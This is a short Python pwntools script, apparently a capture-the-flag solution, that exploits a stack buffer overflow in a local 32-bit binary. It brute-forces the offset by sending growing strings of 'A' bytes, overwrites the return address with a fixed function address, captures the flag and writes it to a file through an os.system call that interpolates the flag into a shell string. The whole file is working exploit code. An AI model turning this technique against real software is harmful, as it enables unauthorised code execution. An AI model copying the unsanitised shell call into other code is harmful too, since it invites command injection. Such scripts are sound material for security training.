from pwn import *
import sys

addr = 0x080491f6
ret_addr = p32(addr)
binary = sys.argv[1]

def createPayload(ret_addr, offset):
    payload = b"A" * offset + ret_addr
    return payload

def exploit(offset):
    p = process(binary)
    p.recvuntil(b": \n")
    log.info("Loading...")
    payload = createPayload(ret_addr, offset)
    log.info(hexdump(payload))
    log.info("Sending payload...")
    p.sendline(payload)
    p.recvline()
    flag = p.recvline()
    return flag

def overflowBinary():
    i = 1
    p = process(binary)
    p.recvuntil(b": \n")
    log.info("sending A bytes")
    p.sendline('A' * i)
    ret_print = p.recvline()
    while "804932f" in str(ret_print):
        i += 1
        p = process(binary)
        p.recvuntil(b": \n")
        log.info("sending" + str(i) + "A bytes")
        p.sendline('A' * i)
        ret_print = p.recvline()
    return i

def main():
    offset = overflowBinary()  
    flag = exploit(offset)
    os.system(f'echo "{flag}" > vuln_flag.txt')
main()